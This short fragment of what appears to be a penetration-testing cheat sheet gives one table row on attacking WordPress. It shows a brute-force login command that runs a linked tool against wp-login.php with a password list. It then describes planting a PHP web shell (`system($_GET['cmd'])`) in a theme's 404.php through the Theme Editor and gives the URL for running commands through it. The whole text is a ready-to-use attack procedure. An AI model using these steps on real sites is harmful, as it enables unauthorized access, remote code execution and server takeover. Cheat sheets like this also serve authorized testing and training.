...
| Condition              | Action                                                                                                                                                                                                                                                                                                                   |
|------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| WordPress              | **Bruteforce login, then RCE via theme editor** The [Tool](https://github.com/loaymorad/wpBrute)<br>**Bruteforce:** `wpbrute -u admin -w passwords.txt -target http://target/wp-login.php`<br>**RCE:** Edit Appearance → Theme Editor → 404.php → add `<?php system($_GET['cmd']) ?>`<br>**Access:** `/wp-content/themes/twentyseventeen/404.php?cmd=id` |
